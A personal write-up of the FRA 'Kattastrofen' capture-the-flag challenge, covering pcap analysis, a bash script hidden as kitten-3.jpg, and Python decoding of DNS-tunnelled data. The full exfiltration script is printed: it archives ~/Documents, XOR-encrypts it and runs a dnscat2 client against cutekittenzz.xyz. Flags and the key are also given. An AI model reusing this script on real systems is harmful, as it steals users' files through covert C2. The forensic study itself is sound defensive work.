# Case Study: Kattastrofen CTF
A Post Mortem analysis of my attempt at completing the Kattastrofen FRA CTF challenge.

https://challenge.fra.se/

## Overview
- The main objective is network traffic analysis inside an archived .pcap file.

- Main tools used: `Wireshark`, `tshark`, `steghide`, `binwalk`, `Python 3`.

## Reconnaissance / Enumeration (Flag 1)
- Analyzing the provided `.pcap` file in Wireshark revealed HTTP traffic containing a transferred zip archive (`kittens.zip`) along with 6 image assets (`kittens-0[1-6].jpg`).

- Utilizing Wireshark's **"Export HTTP Objects"** feature allowed for the extraction of these files directly from the network stream without interacting with the live infrastructure.

- The HTML code revealed a password for the zip file and when opened, revealed the first flag: 'flagga1{klassiska_lösenord_för_100}'

## Hidden files and binaries
- Opening the zip file revealed the original 6 images with the 0 truncated in the numbering (`kittens-[1-6].jpg`) along with 3 additional `.jpg` files `kitten-[7-9].jpg`.

- `Binwalk` was used across all `.jpg` files to discover hidden embedded files.

```bash 
binwalk -e kitten-*.jpg
```

- The `Binwalk` scan revealed this tag on `kitten-3.jpg`:

```bash
Target File:   /home/user/kattastrofen_FRA_CTF/dump/kittens/kitten-3.jpg
MD5 Checksum:  db863507ffe5a55d01304a4f012ec5fd
Signatures:    436

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Executable script, shebang: "/bin/bash"
```

- Bringing the anomalous file to a code editor and renaming the file from `kitten-3.jpg` to `kitten-3.sh` revealed a bash script hiding a command and control center.

```bash
#!/bin/bash

D=$(dirname "$0")
eog "$D/kitten-9.jpg" &

key="P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU="
echo $key |base64 -d > /tmp/key
tar cf - $HOME/Documents > /tmp/exfil.tar
echo "EXFIL $(date)" > /tmp/exfil.dat
echo "SIZE: $(stat -c%s /tmp/exfil.tar)" >> /tmp/exfil.dat
md5sum /tmp/exfil.tar >> /tmp/exfil.dat
echo "BEGIN DATA" >> /tmp/exfil.dat
paste <(od -An -vtu1 -w1 /tmp/exfil.tar) <(while :; do od -An -vtu1 -w1 /tmp/key; done) \
  | LC_ALL=C awk 'NF!=2{exit}; {printf "%c", xor($1, $2)}' | base64 >> /tmp/exfil.dat
echo "END DATA" >> /tmp/exfil.dat

# followed by a large base64 block...

EOM
chmod +x mjau
./mjau cutekittenzz.xyz
```

## Decoding binary
- Extracting and decoding the block into a binary file (`mjau`) for decryption into human readable text allowed for string analysis. This revealed hardcoded logs and the C2 type: `dnscat2`.
	- The search-term "dnscat2" was used due to the use of the `mjau` module at the end of the script.

```bash
strings mjau | grep "dnscat2"
```

```text
The dnscat2 client couldn't connect to the remote host!
Ping response received! This seems like a valid dnscat2 server.
 --ping                  Simply check if there's a dnscat2 server listening.
 --packet-trace          Display incoming/outgoing dnscat2 packets
* It looks like you're running dnscat2 with the system DNS server,
dnscat2 v0.07 (client)
are directly connecting to the dnscat2 server.
/mnt/hgfs/sharedfolder/dnscat2-master/client
```

- The use of a hidden C2 confirms the suspicions of attempted data extraction upon downloading the kittens images.

## Decrypting Traffic
- Using `tshark` i grabbed all the DNS packets which appeared on port 53 after opening the zip file.
	- The packets were split into `MX`, `TXT` and `CNAME` tagged data, with base64 encoded data followed by the domain shown inside the source code: `cutekittenzz.xyz`.

```bash
tshark -r kattastrofen.pcap \ 
		-Y 'dns.qry.name contains "cutekittenzz.xyz"' \
		-T fields -e dns.qry.name > dns_queries.txt
```

- Truncated snippet of `dns_queries.txt`:

```text
01e6002b176dba0021636f6d6d616e6420287562756e74752900.cutekittenzz.xyz
01e6002b176dba0021636f6d6d616e6420287562756e74752900.cutekittenzz.xyz
11e9012b176dbaec63.cutekittenzz.xyz
11e9012b176dbaec63.cutekittenzz.xyz
4da6012b176dbaec63.cutekittenzz.xyz
4da6012b176dbaec63.cutekittenzz.xyz
9e6f012b176dbaec63.cutekittenzz.xyz
9e6f012b176dbaec63.cutekittenzz.xyz
3b0a012b176dbaec63.cutekittenzz.xyz
3b0a012b176dbaec63.cutekittenzz.xyz
...
```

-  I attempted to decode the traffic using this python script i made:

```python
all_chunks = []
with open('dns_queries.txt', "r") as f:
    for row in f:
		clean_row = row.strip()
		sections = clean_row.split('.')
		data_chunk = sections[0]
		all_chunks.append(data_chunk)
		
with open('finished_chunks.txt', 'w') as f:
	f.write("".join(all_chunks))

with open('finished_chunks.txt', 'r') as f:
	hex_data = f.read().strip()
	binary_data = bytes.fromhex(hex_data)

with open('reassembled_exfil.bin', 'wb') as out:
  out.write(binary_data)
```

- This snippet takes the raw b64 encoded packets, splits it into sections with the dots as dividers and grabs the first block which i assumed contained the traffic data.

```python
with open('dns_queries.txt', "r") as f:
	for row in f:
		clean_row = row.strip()
		sections = clean_row.split('.')
		data_chunk = sections[0]
		all_chunks.append(data_chunk)
```

- Then i joined all these packets together, and using pythons `base64` module decoded the data from hexadecimals, to binary and output the result in a `.bin` file.

```python
with open('finished_chunks.txt', 'w') as f:
	f.write("".join(all_chunks))

with open('finished_chunks.txt', 'r') as f:
	hex_data = f.read().strip()
	binary_data = bytes.fromhex(hex_data)

with open('reassembled_exfil.bin', 'wb') as out:
  out.write(binary_data)
```

- After this i spent a couple days trying to decode the traffic with no results. 
	- I followed a few other leads, such as analyzing the image artifacts for encoded stenography or other embedded files with no results. Although `steghide` indicated that something was on those images but required a passphrase which i could not successfully crack.

**END OF UNASSISTED ATTEMPT**
## After viewing an answer key
- After exhausting my personal knowledge i consulted a [write up](https://alisceon.com/texts/writeup-kattastrofen/), to see where i went wrong.

- First was the incorrect `tshark` query, sorting by the domain name resulted in a heavily padded queries log, whereas the writeup filtered the query based on the specific IP used and strictly DNS connections:

```bash
tshark -r kattastrofen.pcap \
		-T fields -e dns.qry.name \
		-Y "ip.src == 10.0.0.10 and dns" > dns_queries.txt
```

- New truncated result, much more nuanced:

```text
01e6002b176dba0021636f6d6d616e6420287562756e74752900.cutekittenzz.xyz
11e9012b176dbaec63.cutekittenzz.xyz
4da6012b176dbaec63.cutekittenzz.xyz
9e6f012b176dbaec63.cutekittenzz.xyz
3b0a012b176dbaec63.cutekittenzz.xyz
ff37012b176dbaec63.cutekittenzz.xyz
61ea012b176dbaec63.cutekittenzz.xyz
3a0b012b176dbaec63.cutekittenzz.xyz
500b012b176dbaec7a0007cfcc80010003455846494c204d6f6e20303520.46656220323032342030353a30393a303220414d205053540a53495a453a.203337383838300a39643962333734633333613836373266386638663161.6638373164376430346620202f746d.cutekittenzz.xyz
```

### Decoding the DNS queries
- The writeup utilizes a similar, more pythonic approach, as well as using the key discovered in the `kitten-3.sh` file to decrypt the XOR obfuscation added to the base64 encoded blocks.

```python
import base64

data = [x.split(".")[:-2] for x in open("dennis.txt").readlines() if x]
data = [bytes.fromhex("".join(blob)[18:]) for blob in data]

b64_data = b"".join(data).split(b"BEGIN DATA")[-1].split(b"END DATA")[0]
decoded_data = base64.b64decode(b64_data)

decoded_key = base64.b64decode("P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU=")
decrypted_data = bytearray()
for i, byte in enumerate(decoded_data):
    decrypted_data.append(byte ^ decoded_key[i%len(decoded_key)])

open("out.tar", "wb").write(decrypted_data)
```

- This uses Pythons 'list comprehension' function to automatically split the data and stitch it together to a list object and truncating the first 18 bytes of the packets, which the author diagnosed as a header due to its repeating hexadecimals, and converts it to raw binary.

- And using the obfuscated bash script again, it gave us the clue of how it separates the data using 'BEGIN DATA' and 'END DATA' as indicators as to where the useful packets lie. So this script automatically filters out the clutter and then decodes the base64 data.

```python
data = [x.split(".")[:-2] for x in open("dennis.txt").readlines() if x]
data = [bytes.fromhex("".join(blob)[18:]) for blob in data]

b64_data = b"".join(data).split(b"BEGIN DATA")[-1].split(b"END DATA")[0]
decoded_data = base64.b64decode(b64_data)
```

- This snippet utilizes the XOR key used to obfuscate the base64 blocks and successfully decrypting it and creates a functioning `.tar` file.

```python
decoded_key = base64.b64decode("P1yq59jxFvIGgyebMmzgQIx6f/ng0fmK+N5+kDdBcgU=")
decrypted_data = bytearray()
for i, byte in enumerate(decoded_data):
    decrypted_data.append(byte ^ decoded_key[i%len(decoded_key)])

open("out.tar", "wb").write(decrypted_data)
```

### Flag 2
- Opening the `.tar` file reveals  `~/user/Documents` directory including a file called `topphemligt.pdf` which reveals another image of a cat with text added, that being the second flag: *flagga2{everyday_is_caturday}*

- I'm omitting the third and final flag as i never reached that stage of the CTF.

## Conclusion and lessons learned
- My original `tshark` export command was far too broad and included multiple duplicate packages, as the broad search term collected the incoming and outgoing traffic all at once, instead of focusing on the strictly exported information which was of importance for this challenge.

- My python script omitted the useful information in lieu of strictly including the header information, which was not useful information to decode and left me only with the beginning of packets or unreadable packets. 
	- I should have omitted the first section and spotted its repetitive nature to realize that it would probably signify boilerplate headers.

- I spent a lot of time analyzing the script itself but failing to acknowledge how to properly utilize the key that was included. I could deduce the purpose of the code:
	1. Upon opening the zip file, show a picture of `kitten-9.jpg` to distract the user.
	2.  Sift through the users `~/Documents` directory, collect information and put it into a `exfil.dat` file and compress this into a `exfil.tar` file
	3. Encrypt it with XOR using the key and send it over a DNS tunnel using a c2 tool (`dnscat2`).
-  And achieving all of this using 'living of the land' tactics, wherein each step uses basic Linux functions.
